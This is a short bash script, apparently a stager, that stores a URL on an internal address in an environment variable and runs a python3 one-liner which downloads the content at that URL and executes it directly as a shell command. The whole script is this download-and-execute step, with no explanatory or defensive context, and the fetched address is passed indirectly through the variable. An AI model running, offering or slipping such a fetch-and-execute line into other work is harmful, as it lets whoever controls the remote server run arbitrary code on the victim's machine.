#!/bin/bash
export P=http://10.0.0.5/s
python3 -c "import urllib.request,os;os.system(urllib.request.urlopen(os.environ['P']).read().decode())"
